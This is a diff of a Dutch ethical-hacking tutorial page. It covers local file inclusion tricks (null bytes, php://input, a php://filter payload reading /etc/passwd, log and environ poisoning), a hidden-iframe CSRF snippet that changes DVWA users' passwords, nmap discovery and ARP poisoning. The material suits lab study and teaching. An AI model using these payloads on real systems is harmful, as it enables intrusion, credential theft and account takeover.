 <p>In sommige gevallen proberen developers een local file inclusion te voorkomen door bijvoorbeeld een extensie op te geven in hun include. Op deze manier kunnen ze voorkomen dat je bijvoorbeeld /etc/passwd uit kan lezen, omdat /etc/passwd.php niet bestaat.</p>
 <p>In programmeertalen worden strings meestal beëindigd met een zogenaamde <a href="https://en.wikipedia.org/wiki/Null_character">null-byte</a>. Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. </p>
 <p>Als het je niet lukte dan kan dit komen omdat je je URL niet correct ge-encode hebt. Een nullbyte kan je niet zomaar meesturen, maar moet door de webserver wel correct geïnterpreteerd worden. Stuur dus %00 mee in plaats van 0x00 of 0. De nullbyte methode werkt enkel in PHP &lt; 5.3.</p>
 <p>In filesystem functies trunct PHP onder linux de paden automatisch naar 4096 tekens. Je kan dit voor elkaar krijgen door voor het path een opstapeling van “./” strings op te nemen totdat je op dit maximum zit.</p>
-<h3>LFI naar RCE via Log bestanden</h3>
+<h3 id="lfi-naar-rce-via-log-bestanden">LFI naar RCE via Log bestanden</h3>
 <p>Je kan met logbestanden potentieel RCE verkrijgen. Als je nieuwsgierig bent kan je de logbestanden in /var/log zelf bekijken en zien welke log bestanden je hiervoor zal kunnen misbruiken. Als je iets in een log bestand weet weg te schrijven kan je vervolgens het bestand includen en je code laten uitvoeren.</p>
-<h3>PHP Wrapper</h3>
-<p>PHP kent verschillende wrappers. Met <a href="http://php.net/manual/en/wrappers.php.php">PHP Wrappers</a> kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file<em>get</em>contents te werken. </p>
-<h4>php://data</h4>
-<h4>php://stdin, php://stdout en php://stderr</h4>
-<h4>php://input</h4>
+<h3 id="php-wrapper">PHP Wrapper</h3>
+<p>PHP kent verschillende wrappers. Met <a href="http://php.net/manual/en/wrappers.php.php">PHP Wrappers</a> kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file_get_contents te werken. </p>
+<h4 id="php-data">php://data</h4>
+<h4 id="php-stdin-php-stdout-en-php-stderr">php://stdin, php://stdout en php://stderr</h4>
+<h4 id="php-input">php://input</h4>
 <p>De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.</p>
 <p>Installeer vervolgens de Firefox <a href="https://addons.mozilla.org/nl/firefox/addon/hackbar/">Hackbar</a> op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en pagina.php met als url: <jeurl>/pagina.php?file=php://input</p>
-<h4>php://output</h4>
-<h4>php://fd</h4>
-<h4>php://memory en php://temp</h4>
-<h4>php://filter</h4>
+<h4 id="php-output">php://output</h4>
+<h4 id="php-fd">php://fd</h4>
+<h4 id="php-memory-en-php-temp">php://memory en php://temp</h4>
+<h4 id="php-filter">php://filter</h4>
 <p>In sommige gevallen kan je enkel gebruik maken van <a href="http://php.net/manual/en/filters.php">filters</a> om informatie uit te lezen. </p>
 <p>De syntax van filters is als volgt:</p>
 <pre><code>php://filter/&lt;type&gt;.&lt;filter&gt;/&lt;parameter&gt;
-</code></pre>
-
-<p>Wil je een bestand uitlezen en deze base64 gecodeerd weergeven dan kun je het volgende gebruiken. </p>
+</code></pre><p>Wil je een bestand uitlezen en deze base64 gecodeerd weergeven dan kun je het volgende gebruiken. </p>
 <pre><code>php://filter/convert.base64-encode/resource=../../../etc/passwd
-</code></pre>
-
-<h3>Zelf bestanden introduceren</h3>
+</code></pre><h3 id="zelf-bestanden-introduceren">Zelf bestanden introduceren</h3>
 <p>Je kan zelf bestanden introduceren door middel van bijvoorbeeld upload formulieren. Op foto deel websites kan je een foto uploaden maar geen PHP bestanden. Je kan PHP code opnemen in de meta data van een afbeelding en deze via LFI kwetsbaarheid laten uitvoeren.</p>
-<h3>Handige systeembestanden</h3>
-<p>Er bestaan systeembestanden die te misbruiken zijn als je de juiste invoer gebruikt. Dit zijn voornamelijk bestanden in de /proc/self mappen van Linux.
-Dit zijn specifieker:</p>
-<h4>/proc/self/cmdline</h4>
-<h4>/proc/self/stat</h4>
-<h4>/proc/self/fd/[0-35]</h4>
+<h3 id="handige-systeembestanden">Handige systeembestanden</h3>
+<p>Er bestaan systeembestanden die te misbruiken zijn als je de juiste invoer gebruikt. Dit zijn voornamelijk bestanden in de /proc/self mappen van Linux.<br>Dit zijn specifieker:</p>
+<h4 id="-proc-self-cmdline">/proc/self/cmdline</h4>
+<h4 id="-proc-self-stat">/proc/self/stat</h4>
+<h4 id="-proc-self-fd-0-35-">/proc/self/fd/[0-35]</h4>
 <p>In een van de filedescriptors van het huidige proces staat de Apache error log weggeschreven. Je kan zelf php code in de logging wegschrijven en deze later weer opvragen.</p>
-<p><img src="http://gatochhacken.nl/images/lfi_file_fd_errorlog.png" /></p>
-<h4>/proc/self/environ</h4>
+<p><img src="http://gatochhacken.nl/images/lfi_file_fd_errorlog.png" alt=""></p>
+<h4 id="-proc-self-environ">/proc/self/environ</h4>
 <p>Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">uaswitcher</a> kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. </p>
-<h3>Cross Site Request Forgery</h3>
-<p>Cross Site Request Forgery of CSRF is een methode waarbij je gebruikers een actie kan laten uitvoeren. </p>
-<h1>Netwerk aanvallen</h1>
-<h2>Enumeratie</h2>
+<h3 id="cross-site-request-forgery">Cross Site Request Forgery</h3>
+<p>Cross Site Request Forgery of CSRF is een methode waarbij je gebruikers een actie kan laten uitvoeren zonder dat ze dit door hebben. In DVWA kan je dit zelf uitproberen, en ook bij CS zul je mogelijkheden vinden om dit te beoefenen.</p>
+<p>Het simpelste voorbeeld uit DVWA is het aanpassen van je wachtwoord. Het formulier is naar de website toegestuurd in de querystring en er is geen mogelijkheid toegevoegd om te verifieren of die wel echt de actie van een ingelogde gebruiker was. Met het volgende code snippet zou je (als je ook XSS toegang hebt) eenvoudig elke langs surfende gebruiker zijn wachtwoord op de website kunnen aanpassen:</p>
+<p><code>&lt;iframe src=&quot;http://&lt;dvwa adres&gt;/vulnerabilities/csrf/?password_new=qwerty&amp;password_conf=qwerty&amp;Change=Change#&quot; style=&quot;width:0px;height:0px;&gt;</code></p>
+<p>Elke gebruiker zal met de onzichtbare <a href="https://www.w3schools.com/tags/tag_iframe.asp">iframe</a> automatisch de password vervang pagina aanroepen en het nieuwe wachtwoord qwerty instellen. </p>
+<h1 id="netwerk-aanvallen">Netwerk aanvallen</h1>
+<h2 id="enumeratie">Enumeratie</h2>
 <p>Ook op netwerken is het erg belangrijk om een juiste enumeratie te doen. Het weten welke hosts er in het netwerk zijn en welke hosts er allemaal beschikbaar zijn om aan te vallen is één van de belangrijkste gegevens.</p>
 <p>Bij het uitvoeren van een red team actie is het van belang dat het red team een zekere opbouw in &quot;detecteerbaarheid&quot; heeft. Immers het is de bedoeling dat het red team op een gegeven moment gedetecteerd wordt door het blue team om op deze wijze ook de incident response te kunnen testen.</p>
-<h3>Passive host discovery</h3>
+<h3 id="passive-host-discovery">Passive host discovery</h3>
 <p>Er zijn diverse manieren om hosts op een netwerk te ontdekken, je kan actief scannen maar ook passief ontdekken welke systemen aanwezig zijn. Dit ontdekken zonder zelf activiteit in het netwerk te veroorzaken zal logischerwijs minder opvallen. Je kan met TCPdump een netwerkdump maken en deze in wireshark openen. Kijk naar alle binnenkomende ARP antwoorden en maak een lijstje van alle IP adressen die je voorbij ziet komen. Je kan, afhankelijk van de data die je binnenkrijgt natuurlijk ook andere protocollen dan ARP meenemen in dit lijstje.</p>
 <p>Dit kun je ook eenvoudiger maken met de tool netdiscover en de schakeloptie -p.</p>
-<h3>Actieve host discovery</h3>
-<h4>Ping sweep</h4>
+<h3 id="actieve-host-discovery">Actieve host discovery</h3>
+<h4 id="ping-sweep">Ping sweep</h4>
 <p>Een ping sweep is iets wat in gemonitorde omgevingen waarschijnlijk op zal vallen en het zal alleen werken als er geen ICMP filtering is geïmplementeerd. ICMP filtering voorkomt immers dat een host op een PING verzoek kan reageren.</p>
 <p>Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP <ipange> om het IP adres van je home lab server te vinden.</p>
-<h3>Port scan</h3>
+<h3 id="port-scan">Port scan</h3>
 <p>nmap -p <ports> <ip></p>
-<h2>ARP poisoning</h2>
+<h2 id="arp-poisoning">ARP poisoning</h2>
 <p>Een van de manieren om een man in the middle positie te bemachtigen is ARP poisoning. ARP staat voor Address Resolution Protocol. Om de werking van ARP op een goede manier te begrijpen is het noodzakelijk om het OSI model te snappen. Voor het OSI model verwijs ik terug naar het &quot;protocollen&quot; kopje.</p>
 <p>Het ARP protocol (laag 6) zorgt ervoor dat de computers binnen een IP subnet (laag 5) van elkaar kunnen weten aan welk MAC adres men een frame moet zenden. Als voorbeeld hebben wij een netwerk met de volgende systemen:</p>
-<p>Hostnaam   - IP Adres	 - MAC adres
-Computer A - 192.168.1.2 - MACADDR1
-Computer B - 192.168.1.3 - MACADDR2</p>
+<p>Hostnaam   - IP Adres     - MAC adres<br>Computer A - 192.168.1.2 - MACADDR1<br>Computer B - 192.168.1.3 - MACADDR2</p>
 <p>Op het moment dat computer A een berichtje wil sturen naar computer B zal computer A zowel het IP adres als het MAC adres van computer B weten. Het IP adres is ingegeven door de gebruiker, met dat IP adres stuurt computer A een ARP verzoek.</p>
 <blockquote>
 <p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
@@ -538,11 +682,7 @@ Computer B - 192.168.1.3 - MACADDR2</p>
 <p>192.168.1.3 is te vinden op MACADDR2</p>
 </blockquote>
 <p>Op dat moment weet computer A het juiste MAC adres en kan computer A het pakketje versturen.</p>
-<p>Bij ARP poisoning komen wij op computer C om de hoek.
-Hostnaam   - IP Adres	 - MAC adres
-Computer A - 192.168.1.2 - MACADDR1
-Computer B - 192.168.1.3 - MACADDR2
-Computer C - 192.168.1.4 - EVILMAC1</p>
+<p>Bij ARP poisoning komen wij op computer C om de hoek.<br>Hostnaam   - IP Adres     - MAC adres<br>Computer A - 192.168.1.2 - MACADDR1<br>Computer B - 192.168.1.3 - MACADDR2<br>Computer C - 192.168.1.4 - EVILMAC1</p>
 <p>Computer A vraagt weer in het netwerk:</p>
 <blockquote>
 <p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
@@ -563,10 +703,10 @@ Computer C - 192.168.1.4 - EVILMAC1</p>
 </blockquote>
 <p>naar het MAC adres van computer A. Op onze eigen computer zorgen wij ervoor dat wij de binnengekomen pakketten ook opnieuw verzenden naar de goede computer zodat het netwerk blijft draaien, en je hebt een Man in the Middle positie bemachtigd.</p>
 <p>Tooling: Arpspoof, ettercap, bettercap </p>
-<h1>Dankwoord</h1>
+<h1 id="dankwoord">Dankwoord</h1>
 <p>Github bedankt voor het hosten :)</p>
 <!-- Global site tag (gtag.js) - Google Analytics -->
-<p><script async src="https://www.googletagmanager.com/gtag/js?id=UA-118698551-1"></script></p>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-118698551-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
